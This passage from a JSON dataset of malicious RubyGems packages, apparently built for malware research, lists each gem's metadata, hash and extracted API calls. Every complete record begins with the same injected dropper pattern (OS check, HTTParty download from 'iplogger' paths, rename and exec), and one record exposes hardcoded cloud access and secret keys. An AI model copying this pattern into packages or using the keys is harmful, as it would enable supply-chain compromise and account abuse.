            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'base.extend', 'class_attribute', 'self.base_class.name.to_s', 'self.base_class.name', 'self.base_class', 'options.[]', 'has_many', 'has_many', 'include', 'extend', 'table_name', 'table_name', 'table_name', 'primary_key', 'find_by_sql', 'acts_as_taggable_options.[]', 'acts_as_taggable_options', 'table_name', 'sql.<<', 'table_name', 'primary_key', 'options.[]', 'sql.<<', 'sanitize_sql', 'options.[]', 'sql.<<', 'options.[]', 'sql.<<', 'options.[]', 'options.[]', 'sql.<<', 'options.[]', 'options.[]', 'sql.<<', 'options.[]', 'find_by_sql', 'Keyword.transaction', 'keywordings.destroy_all', 'keywordings', 'Keyword.parse(list).each', 'Keyword.parse', 'acts_as_keywordable_options.[]', 'acts_as_keywordable_options', 'send(acts_as_keywordable_options.[](:from)).keywords.find_or_create_by_name(name).on', 'send(acts_as_keywordable_options.[](:from)).keywords.find_or_create_by_name', 'send(acts_as_keywordable_options.[](:from)).keywords', 'send', 'acts_as_keywordable_options.[]', 'acts_as_keywordable_options', 'Keyword.find_or_create_by_name(name).on', 'Keyword.find_or_create_by_name', 'Keyword.transaction', 'keywordings.destroy_all', 'keywordings', 'Keyword.parse(list).each', 'Keyword.parse', 'acts_as_keywordable_options.[]', 'acts_as_keywordable_options', 'send(acts_as_keywordable_options.[](:from)).keywords.find_or_create_by_name(name).on', 'send(acts_as_keywordable_options.[](:from)).keywords.find_or_create_by_name', 'send(acts_as_keywordable_options.[](:from)).keywords', 'send', 'acts_as_keywordable_options.[]', 'acts_as_keywordable_options', 'Keyword.find_or_create_by_name(name).on', 'Keyword.find_or_create_by_name', 'ActiveRecord::Base.send', 'has_many', 'list.split(/[\\\\r\\\\n]/).uniq.reject', 'list.split(/[\\\\r\\\\n]/).uniq', 'list.split', 'c.==', 'keyword_names.map', 't.strip', 'keyword_names.delete_if', 't.empty?', 'keywordings.collect', 'keywordings', 'keywording.keywordable', 'keywordings.create', 'keywordings', 'keywordings.find_all_by_keywordable_type', 'keywordings', 'keywordable.to_s', 'name.==', 'name', 'comparison_object.to_s', 'name', 'belongs_to', 'belongs_to', 'ActiveRecord::Base.send(:class_name_of_active_record_descendant, keywordable.class).to_s', 'ActiveRecord::Base.send', 'keywordable.class', 'tagged_class.constantize.find', 'tagged_class.constantize']",
            "n_tokens": 716,
            "embedding": "[-0.00240219  0.01027211 -0.00507265 ...  0.00752118 -0.02042717\n  0.01043795]",
            "cluster": "0",
            "id": 531,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acts-as_keywordable/0.0.9/acts-as_keywordable-0.0.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acts-as_keywordable/0.0.9/acts-as_keywordable-0.0.9_extracted",
            "name": "acts-as_keywordable",
            "version": "0.0.9",
            "published_at": "2020-02-21T23:34:05.696Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, ruby-debug",
            "SHA-256": "dbf351b8e33eea7bee657565002b30a512fd24d3870d28f1f5f0c66bb081355e"
        },
        {
            "name_version": "active-explorer-0.0.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-explorer/0.0.9/active-explorer-0.0.9_extracted/active-explorer-0.0.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'depth.<=', 'puts', 'object.nil?', 'puts', 'ActiveExplorer::Exploration.new', 'exploration.to_console', 'alias_method', 'depth.<=', 'puts', 'object.nil?', 'puts', 'file_name.nil?', 'object.class.name.downcase', 'object.class.name', 'object.class', 'object.id', 'puts', 'ActiveExplorer::Exploration.new', 'exploration.to_image', 'alias_method', 'cattr_accessor', 'cattr_accessor', 'cattr_accessor', 'cattr_accessor', 'require', 'require', 'require', 'class_filter.nil?', 'class_filter.is_a?', 'class_filter.is_a?', 'raise', 'class_filter.class', 'association_filter.nil?', 'association_filter.is_a?', 'raise', 'association_filter.class', 'association_filter.nil?', 'association_filter.empty?', '(association_filter & ASSOCIATION_FILTER_VALUES)\\n.any?', 'association_filter.&', 'raise', 'ASSOCIATION_FILTER_VALUES.to_s.[]', 'ASSOCIATION_FILTER_VALUES.to_s', 'ActiveExplorer::Config.attribute_limit', 'ActiveExplorer::Config.attribute_filter', 'make_safe', '@object.class.name', '@object.class', 'attributes', '@depth.zero?', 'ActiveExplorer::Config.class_filter', '@class_filter.is_a?', '[:show, :ignore].each', '@class_filter.[]=', '@class_filter.[](group).present?', '@class_filter.[]', 'each_val_to_s', '@class_filter.[]', 'ActiveExplorer::Config.association_filter', '@association_filter.present?', '@association_filter.include?', 'associtations', 'subobjects_hash', 'subobject_hash.empty?', '@hash.[]=', '@object.attributes.symbolize_keys', '@object.attributes', 'attrs.first(@attribute_limit).to_h', 'attrs.first', '@attribute_filter.nil?', '@attribute_filter.[]', '@object.class.name.downcase.pluralize.to_sym', '@object.class.name.downcase.pluralize', '@object.class.name.downcase', '@object.class.name', '@object.class', 'attrs.select', 'filter.include?', '@hash.dup', 'Writer.new(self).write', 'Writer.new', 'Painter.new(self, file).paint', 'Painter.new', 'private', 'associations.each_with_object', 'association_type', 'subobjects_from_association', 'subobject.present?', 'is_parent?', 'results.push', 'subobject_hash', 'subobjects_from_association', 'subobjects.present?', 'subobjects.each', 'is_parent?', 'results.push', 'subobject_hash', 'association_type', 'explore', 'exploration.get_hash', 'hash.[]=', 'object.send', 'association.name', 'subobjects.present?', 'association.macro', 'add_error_hash', 'e.message', 'association.name', '@association_filter.nil?.!', '@association_filter.nil?', '@association_filter.any?', 'association_type.==', 'Exploration.new', '@depth.-', 'object.class.reflections.collect', 'object.class.reflections', 'object.class', 'reflection.second', 'association_filter.nil?.!', 'association_filter.nil?', 'association_filter.any?', 'association_filter.include?(:all).!', 'association_filter.include?', 'associations.select!', 'association_filter.include?', 'association_type', 'class_filter.[](:show).any?', 'class_filter.[]', 'associations.select!', 'should_show?', 'class_filter.[](:ignore).any?', 'class_filter.[]', 'associations.reject!', 'should_ignore?', '@hash.[]=', 'make_safe', '@object.class.name', '@object.class', '@hash.[]=', 'attributes', '@hash.[]=', '@object.class.name', '@object.class', '@object.id', 'association.macro', 'text.length.<', 'text.length', 'text.[](0..70).+', 'text.[]', 'text.tr', 'array.collect', 'a.to_s', 'object.===', '@class_filter.[](:show).include?', '@class_filter.[]', 'association.plural_name.to_s', 'association.plural_name', '@class_filter.[](:ignore).include?', '@class_filter.[]', 'association.plural_name.to_s', 'association.plural_name', 'GraphViz.new', 'paint_object', '@exploration.get_hash', 'save_to_file', 'private', 'parent_node.nil?', 'add_node', 'parent_node.nil?', 'add_edge', 'hash.[]', 'hash.[](:subobjects).nil?', 'hash.[]', 'paint_subobjects', 'hash.[]', 'subhashes.each', 'paint_object', 'hash.[](:attributes).[]', 'hash.[]', 'make_safe', 'hash.[]', 'make_safe', 'hash.[](:attributes).keys.join', 'hash.[](:attributes).keys', 'hash.[]', 'hash.[](:attributes).values.collect', 'hash.[](:attributes).values', 'hash.[]', 'val.nil?', 'val.is_a?', 'make_short', 'make_short', 'val.to_s', 'make_safe', 'values.join', 'style.==', 'graph.add_node', 'graph.add_node', 'edge_exists?', 'graph.add_edge', 'association.==', 'association.==', 'edge_exists?', 'graph.add_edge', 'edge_exists?', 'graph.add_edge', 'graph.each_edge', 'edge.node_one.==', 'edge.node_one', 'node_one.id', 'edge.node_two.==', 'edge.node_two', 'node_two.id', '@file_path.split(File::SEPARATOR).last', '@file_path.split', '@file_path.chomp', 'directory.empty?', 'create_directory', '@graph.output', 'directory.empty?', 'File.directory?', 'FileUtils.mkdir_p', 'text.length.<', 'text.length', 'text.[](0..70).+', 'text.[]', 'text.tr', '@exploration.get_hash', 'puts', 'exploration_hash.[]', 'exploration_hash.[](:attributes).[]', 'exploration_hash.[]', 'write_object', 'puts', 'private', 'object.[]', 'object.[](:attributes).[]', 'object.[]', 'object.[]', 'object.[]', 'attributes.delete', '\"    \".*', 'level.>', 'margin.[]=', 'object.[](:association).==', 'object.[]', 'puts', 'error_message.present?', '\"    \".*', 'error_message.present?', 'puts', 'object.[](:subobjects).nil?', 'object.[]', 'write_objects', 'object.[]', 'level.+', 'objects.each', 'write_object']",
            "n_tokens": 1472,
            "embedding": "[-0.00243206  0.00839792 -0.00881878 ... -0.01526718 -0.00783676\n  0.00728045]",
            "cluster": "0",
            "id": 524,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-explorer/0.0.9/active-explorer-0.0.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-explorer/0.0.9/active-explorer-0.0.9_extracted",
            "name": "active-explorer",
            "version": "0.0.9",
            "published_at": "2020-02-22T00:53:40.959Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, rspec-nc, guard, guard-rspec, sqlite3, awesome_print, factory_girl, appraisal, pry, pry-byebug, ruby-graphviz, activerecord",
            "SHA-256": "990af6b0f1989198c22eccaae7f91f93acbc82f72372f3d895f65c3113fea514"
        },
        {
            "name_version": "app_deployer-0.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/app_deployer/0.0.3/app_deployer-0.0.3_extracted/app_deployer-0.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'namespace', 'desc', 'task', 'run', 'latest_release', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'namespace', 'desc', 'task', 'remote_file_exists?', 'previous_release', 'pretty_print', 'run', 'try_sudo', 'previous_release', 'latest_release', 'puts_ok', 'remote_file_exists?(\"#{latest_release}/composer.phar\").!', 'remote_file_exists?', 'latest_release', 'pretty_print', 'run', 'try_sudo', 'latest_release', 'curl_options', 'php_bin', 'pretty_print', 'run', 'try_sudo', 'latest_release', 'php_bin', 'puts_ok', 'desc', 'desc', 'task', 'composer_bin.!', 'composer_bin', 'composer.get', 'composer', 'set', 'php_bin', 'pretty_print', 'run', 'try_sudo', 'latest_release', 'composer_bin', 'composer_options', 'puts_ok', 'desc', 'task', 'composer_bin.!', 'composer_bin', 'composer.get', 'composer', 'set', 'php_bin', 'pretty_print', 'run', 'try_sudo', 'latest_release', 'composer_bin', 'composer_options', 'puts_ok', 'desc', 'task', 'composer_bin.!', 'composer_bin', 'composer.get', 'composer', 'set', 'php_bin', 'pretty_print', 'run', 'try_sudo', 'latest_release', 'composer_bin', 'puts_ok', 'task', 'pretty_print', 'run', 'current_path', 'latest_release', 'puts_ok', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'require', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', 'File.join', 'shared_path', '_cset', 'File.join', 'tmp_path', '_cset', 'File.join', 'tmp_path', 'cakephp_version.>=', 'cakephp_version', 'set', 'set', 'set', 'set', 'set', 'File.join', 'shared_path', 'database_partial_path', 'after', 'after', '[\"composer:install\", \"composer:update\"].each', 'before', 'copy_vendors', 'composer.copy_vendors', 'composer', 'after', 'use_composer', 'update_vendors', 'composer.update', 'composer', 'composer.install', 'composer', 'clear_cache', 'cakephp.cache.clear', 'cakephp.cache', 'cakephp', 'namespace', 'desc', 'shared_path', 'task', 'transaction', 'run', 'shared_path', 'cakephp_repo', 'checkout', 'shared.setup', 'shared', 'database.config', 'database', 'desc', 'task', 'stream', 'shared_path', 'cakephp_branch', 'desc', 'task', 'stream', 'shared_path', 'desc', 'task', 'transaction', 'database.create_symlink', 'database', 'shared.create_symlink', 'shared', 'namespace', 'desc', 'task', 'run', 'try_sudo', 'cache_path', 'namespace', 'desc', 'shared_path', 'current_path', 'task', 'on_rollback', 'run', 'database_path', 'puts', 'prompt_with_default', 'cakephp_version.>=', 'cakephp_version', 'prompt_with_default', 'prompt_with_default', 'prompt_with_default', 'user', 'set', 'Capistrano::CLI.password_prompt', 'prompt_with_default', 'prompt_with_default', 'prompt_with_default', 'File.read', 'File.join', 'File.dirname', 'ERB.new(template).result', 'ERB.new', 'binding', 'put', 'database_path', 'after', 'desc', 'deploy_to', 'task', 'run', 'try_sudo', 'current_path', 'database_partial_path', 'run', 'try_sudo', 'database_path', 'current_path', 'database_partial_path', 'namespace', 'desc', 'task', 'deploy_to', 'releases_path', 'shared_path', 'shared_children.map', 'shared_children', 'File.join', 'shared_path', 'tmp_children.map', 'tmp_children', 'File.join', 'tmp_path', 'cache_children.map', 'cache_children', 'File.join', 'cache_path', 'run', 'try_sudo', '(dirs + tmp_dirs)\\n.join', 'dirs.+', 'user.empty?.!', 'user.empty?', 'user', 'run', 'try_sudo', 'tmp_path', 'shared_app_dirs', 'shared_app_dirs.each', 'shared_app_dirs', 'run', 'try_sudo', 'shared_path', 'desc', 'task', 'run', 'shared_path', 'latest_release', 'shared_app_dirs', 'shared_app_dirs.each', 'shared_app_dirs', 'run', 'shared_path', 'current_path', 'namespace', 'desc', 'task', 'run', 'try_sudo', 'logs_path', 'desc', 'task', 'logs_files.map', 'logs_files', 'File.join', 'logs_path', 'stream', 'try_sudo', 'files.join', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'require', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', 'File.join', 'shared_path', '_cset', 'File.join', 'database_folder', '_cset', 'File.join', 'shared_path', '_cset', 'File.join', 'tmp_path', '_cset', 'File.join', 'tmp_path', 'after', 'after', '[\"composer:install\", \"composer:update\"].each', 'before', 'copy_vendors', 'composer.copy_vendors', 'composer', 'after', 'use_composer', 'update_vendors', 'composer.update', 'composer', 'composer.install', 'composer', 'clear_cache', 'lithium.cache.clear', 'lithium.cache', 'lithium', 'namespace', 'desc', 'shared_path', 'task', 'transaction', 'use_composer', 'run', 'shared_path', 'lithium_repo', 'checkout', 'connections.setup', 'connections', 'shared.setup', 'shared', 'desc', 'task', 'on_rollback', 'run', 'shared_path', 'stream', 'shared_path', 'lithium_branch', 'desc', 'task', 'stream', 'shared_path', 'desc', 'task', 'transaction', 'connections.create_symlink', 'connections', 'shared.create_symlink', 'shared', 'namespace', 'desc', 'task', 'run', 'try_sudo', 'cache_path', 'namespace', 'desc', 'shared_path', 'current_path', 'task', 'on_rollback', 'run', 'database_path', 'puts', 'prompt_with_default', 'type', 'prompt_with_default', 'user', 'set', 'Capistrano::CLI.password_prompt', 'prompt_with_default', 'prompt_with_default', 'prompt_with_default', 'application', 'File.read', 'File.join', 'File.dirname', 'ERB.new(template).result', 'ERB.new', 'binding', 'run', 'try_sudo', 'database_folder', 'put', 'database_path', 'desc', 'task', 'run', 'try_sudo', 'database_path', 'current_path', 'namespace', 'desc', 'task', 'deploy_to', 'releases_path', 'shared_path', 'shared_children.map', 'shared_children', 'File.join', 'shared_path', 'tmp_children.map', 'tmp_children', 'File.join', 'tmp_path', 'cache_children.map', 'cache_children', 'File.join', 'cache_path', 'user.empty?.!', 'user.empty?', 'user', 'run', 'try_sudo', '(dirs + tmp_dirs)\\n.join', 'dirs.+', 'try_sudo', 'tmp_path', 'shared_app_dirs', 'shared_app_dirs.each', 'shared_app_dirs', 'run', 'try_sudo', 'shared_path', 'desc', 'task', 'run', 'shared_path', 'latest_release', 'shared_app_dirs', 'shared_app_dirs.each', 'shared_app_dirs', 'run', 'shared_path', 'current_path', 'namespace', 'desc', 'task', 'run', 'try_sudo', 'logs_path', 'desc', 'task', 'logs_files.map', 'logs_files', 'File.join', 'logs_path', 'stream', 'try_sudo', 'files.join', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'exists?', 'set', 'set', 'Capistrano::CLI.ui.ask', 'Capistrano::CLI.ui', 'eval', 'var.to_s', 'set', '\"true\".==', 'capture(\"if [ -e #{full_path} ]; then echo \\'true\\'; fi\").strip', 'capture', 'fetch', 'deps.[]', 'deps.[](location).[]', 'deps.[]', 'deps.[](location).[](type).<<', 'deps.[](location).[]', 'deps.[]', 'set', 'ENV.[]=', 'ENV.[]', 'ENV.[]=', 'logger', 'logger.trace', 'logger', 'cmd.inspect', 'Benchmark.realtime', '$?.to_i.>', '$?.to_i', 'raise', 'logger', 'logger.trace', 'logger', '(elapsed * 1000)\\n.round', 'elapsed.*', 'args.last.is_a?', 'args.last', 'args.pop', 'args.shift', 'args.any?', 'raise', 'options.fetch', 'fetch', 'fetch', 'invoke_command', 'via.==', 'sudo', 'args.last.is_a?', 'args.last', 'args.pop', 'args.<<', 'options.merge', 'fetch', 'try_sudo', 'logger.level.==', 'logger.level', 'logger', 'pretty_errors', 'msg.slice', 'msg.<<', '\".\".*', '60.-', 'msg.size', 'print', 'puts', 'msg.green', 'logger.level.==', 'logger.level', 'logger', '$error.!', 'puts', '\"✔\".green', '$pretty_errors_defined.!', '\"✘\" << \"\\\\n\".<<', '\"✘\".<<', '_write', 's.red', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'namespace', 'desc', 'task', 'require', 'prompt_with_default', '_cset', 'Capistrano::CLI.password_prompt', 'prompt_with_default', 'prompt_with_default', 'prompt_with_default', 'user', '_cset', 'Capistrano::CLI.password_prompt', 'prompt_with_default', 'application', 'prompt_with_default', 'set', 'File.join', 'shared_path', 'db_name', 'File.read', 'File.join', 'File.dirname', 'ERB.new(template).result', 'ERB.new', 'binding', 'put', 'tmp_filename', 'run', 'mysql_admin_user', 'mysql_admin_password', 'tmp_filename', 'run', 'try_sudo', 'tmp_filename', 'desc', 'task', 'prompt_with_default', '_cset', 'Capistrano::CLI.password_prompt', 'Capistrano::CLI.ui.ask', 'Capistrano::CLI.ui', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', 'run', 'mysql_admin_user', 'mysql_admin_password', 'download', 'logger.info', 'logger', 'run', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'require', 'require', 'require', '_cset', 'abort', '_cset', 'abort', '_cset', '_cset', '_cset', '_cset', 'application', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', '_cset', 'default_run_options.[]=', 'default_run_options', 'ssh_options.[]=', 'ssh_options', '_cset', '_cset', '_cset', '_cset', 'Capistrano::Deploy::SCM.new', 'scm', '_cset', 'source.head', 'source', '_cset', 'source.local.query_revision', 'source.local', 'source', 'revision', 'with_env', 'run_locally', '_cset', 'Capistrano::Deploy::Strategy.new', 'deploy_via', '_cset', 'set', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', '_cset', '_cset', '_cset', '_cset', '_cset', 'File.join', 'deploy_to', 'version_dir', '_cset', 'File.join', 'deploy_to', 'shared_dir', '_cset', 'File.join', 'deploy_to', 'current_dir', '_cset', 'File.join', 'releases_path', 'release_name', '_cset', 'capture(\"ls -x #{releases_path}\", { except: { no_release: true } }).split.sort', 'capture(\"ls -x #{releases_path}\", { except: { no_release: true } }).split', 'capture', 'releases_path', '_cset', 'releases.length.>', 'releases.length', 'releases', 'File.join', 'releases_path', 'releases.last', 'releases', '_cset', 'releases.length.>', 'releases.length', 'releases', 'File.join', 'releases_path', 'releases.[]', 'releases', '_cset', 'capture(\"cat #{current_path}/REVISION\", { except: { no_release: true } }).chomp', 'capture', 'current_path', '_cset', 'capture(\"cat #{current_release}/REVISION\", { except: { no_release: true } }).chomp', 'capture', 'current_release', '_cset', 'previous_release', 'capture(\"cat #{previous_release}/REVISION\", { except: { no_release: true } }).chomp', 'capture', 'previous_release', '_cset', 'fetch', '_cset', 'exists?', 'release_path', 'current_release', 'STDOUT.sync', 'before', 'deploy_via', 'logger.level.==', 'logger.level', 'logger', 'pretty_errors', 'puts', 'puts', 'msg.green', 'after', 'use_compass', 'compass.compile', 'compass', 'after', 'puts', '\"--> Successfully deployed!\".green', 'namespace', 'desc', 'task', 'update', 'desc', 'task', 'deploy_to', 'releases_path', 'shared_path', 'shared_children.map', 'shared_children', 'File.join', 'shared_path', 'd.split(\"/\").last', 'd.split', 'run', 'try_sudo', 'dirs.join', 'fetch', 'run', 'try_sudo', 'dirs.join', 'desc', 'task', 'transaction', 'update_code', 'create_symlink', 'cleanup', 'desc', 'task', 'on_rollback', 'run', 'release_path', 'strategy.deploy!', 'strategy', 'finalize_update', 'desc', 'task', 'fetch', 'run', 'latest_release', 'desc', 'task', 'Kernel.warn', 'create_symlink', 'desc', 'task', 'on_rollback', 'previous_release', 'run', 'current_path', 'previous_release', 'current_path', 'logger.important', 'logger', 'run', 'current_path', 'latest_release', 'current_path', 'desc', 'task', '(ENV.[](\"FILES\") || \"\").split(\",\").map { |f,|\\n  Dir.[](f.strip)\\n}.flatten', '(ENV.[](\"FILES\") || \"\").split(\",\").map', '(ENV.[](\"FILES\") || \"\")\\n.split', 'ENV.[]', 'Dir.[]', 'f.strip', 'files.empty?', 'abort', 'files.each', 'top.upload', 'top', 'File.join', 'current_path', 'namespace', 'desc', 'task', 'previous_release', 'run', 'current_path', 'previous_release', 'current_path', 'abort', 'desc', 'task', 'run', 'current_path', 'current_release', 'current_release', 'desc', 'task', 'revision', 'cleanup', 'desc', 'task', 'revision', 'cleanup', 'desc', 'task', 'fetch(:keep_releases, 5).to_i', 'fetch', 'capture(\"ls -xt #{releases_path}\").split.reverse', 'capture(\"ls -xt #{releases_path}\").split', 'capture', 'releases_path', 'count.>=', 'local_releases.length', 'logger.important', 'logger', 'logger.info', 'logger', 'local_releases.length', '(local_releases - local_releases.last(count)).map { |release,|\\n  File.join(releases_path, release)\\n}.join', '(local_releases - local_releases.last(count))\\n.map', 'local_releases.-', 'local_releases.last', 'File.join', 'releases_path', 'try_sudo', 'desc', 'task', 'strategy.check!', 'strategy', 'fetch', 'other.each', 'types.each', 'type.==', 'dependencies.send(location).command(fetch(:gem_command, \"gem\")).or', 'dependencies.send(location).command', 'dependencies.send', 'fetch', 'calls.each', 'dependencies.send(location).send', 'dependencies.send', 'dependencies.pass?', 'puts', 'puts', 'dependencies.reject { |d,|\\n  d.pass?\\n}.each', 'dependencies.reject', 'd.pass?', 'puts', 'd.message', 'abort', 'desc', 'task', 'update', 'namespace', 'desc', 'task', 'system', 'source.local.diff', 'source.local', 'source', 'current_revision', 'desc', 'task', 'source.next_revision', 'source', 'current_revision', 'system', 'source.local.log', 'source.local', 'source', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'require', 'namespace', 'namespace', 'desc', 'task', 'on_rollback', 'run', 'shared_path', 'warn', 'ENV.[]', 'ENV.[]', 'File.read', 'File.join', 'File.dirname', 'ERB.new(template).result', 'ERB.new', 'binding', 'put', 'shared_path', 'desc', 'task', 'run', 'shared_path', 'Capistrano::Configuration.instance(:must_exist).load', 'Capistrano::Configuration.instance', 'after', 'namespace', 'desc', 'task', 'run']",
            "n_tokens": 4142,
            "embedding": "[-0.0107137  -0.0129849  -0.01336653 ...  0.00076734 -0.02146464\n  0.0149303 ]",
            "cluster": "0",
            "id": 169,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/app_deployer/0.0.3/app_deployer-0.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/app_deployer/0.0.3/app_deployer-0.0.3_extracted",
            "name": "app_deployer",
            "version": "0.0.3",
            "published_at": "2020-02-22T01:00:59.399Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "capistrano, colored",
            "SHA-256": "3b820cb739161e14759a66418c52290fdd1b24b82e2c4d375d3b25f1bd0d49ed"
        },
        {
            "name_version": "ba-upload-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ba-upload/0.1.0/ba-upload-0.1.0_extracted/ba-upload-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'OpenSSL::PKCS12.new', 'File.read', 'Tempfile.new([\"key\", \".pem\"]).tap', 'Tempfile.new', 'f.write', 'cert.key.to_s', 'cert.key', 'f.flush', 'Tempfile.new([\"cert\", \".pem\"]).tap', 'Tempfile.new', 'f.write', 'cert.certificate.to_s', 'cert.certificate', 'f.flush', 'Tempfile.new([\"ca_cert\", \".pem\"]).tap', 'Tempfile.new', 'f.write', 'cert.ca_certs.reverse.join', 'cert.ca_certs.reverse', 'cert.ca_certs', 'f.flush', 'BaUpload.export_certificate', 'BaUpload::Connection.new', 'cert.[]', 'cert.[]', 'cert.[]', 'require', 'require', 'attr_reader', 'require', 'Mechanize.new', '@m.key=', '@key.path', '@m.ca_file=', '@ca_cert.path', '@m.cert=', '@cert.path', 'm.get', 'm', 'm.page.forms.first', 'm.page.forms', 'm.page', 'm', 'form.file_uploads.first.file_name=', 'form.file_uploads.first', 'form.file_uploads', 'form.submit', 'm.get', 'm', 'm.page.links_with', 'm.page', 'm', 'links.map', 'ErrorFile.new', 'mechanize_link.href', '@mechanize_link.click', 'response.xml.to_s', 'response.xml', '@mechanize_link.text', 'Tempfile.new', 'tf.write', 'read', 'tf.flush']",
            "n_tokens": 418,
            "embedding": "[ 0.00806416 -0.02045495  0.00073637 ... -0.00342813 -0.03271208\n  0.02053415]",
            "cluster": "0",
            "id": 793,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ba-upload/0.1.0/ba-upload-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ba-upload/0.1.0/ba-upload-0.1.0_extracted",
            "name": "ba-upload",
            "version": "0.1.0",
            "published_at": "2020-02-22T01:07:57.073Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, mechanize",
            "SHA-256": "14542dedd0ff8ee362f606dfb355f06b5677659b91fcb03ee91739641212e80f"
        },
        {
            "name_version": "bbs-uploader-0.1.6",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bbs-uploader/0.1.6/bbs-uploader-0.1.6_extracted/bbs-uploader-0.1.6_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', '\"image\".freeze', '\"file\".freeze', 'default_options', '@@qiniu.!=', 'default_options', 'Hashie::Mash.new', 'Hashie::Mash.new({ access_key: \"79WvzAxvV-nOEX7m0PERzwR0Lhm-FDHriz2-QdAN\", secret_key: \"4wwnWNU16n9uVK8DHRW6qO61b2gls3aSduHswkvc\", bucket: \"bss-image\", bucket_domain: \"ognvcf5x6.bkt.clouddn.com\" }).merge', 'Hashie::Mash.new', 'puts', 'file_path.==', '\"\".freeze', 'url.scan(/.*\\\\/([^\\\\/]*)/).flatten.[]', 'url.scan(/.*\\\\/([^\\\\/]*)/).flatten', 'url.scan', 'File.exist?', 'File.open', 'open', 'saved_file.write', 'read_file.read', 'puts', 'establish_connection', 'Qiniu::Storage.stat', 'self.qiniu.[]', 'self.qiniu', 'file_type.==', 'File.basename', 'file_type.==', 'File.basename', '(code = get_file_info(key))\\n.==', 'get_file_info', 'establish_connection', 'Qiniu::Auth::PutPolicy.new', 'self.qiniu.[]', 'self.qiniu', 'Qiniu::Auth.generate_uptoken', 'Qiniu::Storage.upload_with_token_2', 'self.qiniu.[]', 'self.qiniu', 'code.==', 'self.qiniu.[]', 'self.qiniu', 'puts', 'URI.encode', 'puts', 'puts', 'puts', 'file_path.=~', 'upload_file', 'puts', 'markdown_image_link', 'puts', 'resource.=~', 'download', 'file_path.=~', 'upload_image', 'upload_file', 'File.exist?', 'File.absolute_path', 'resource.=~', 'upload_image', 'upload_file', 'puts', '`cd #{dir}; pwd`.chomp', 'File.exists?', 'File.directory?', 'puts', '`ls #{dir}`.split(\"\\\\n\").map', '`ls #{dir}`.split', 'files.map', 'upload', 'puts', 'file_links.join', 'image_url.is_a?', 'IMAGE_URL_REGEXP.match', 'upload_with_directory(dir).map { |link,|\\n  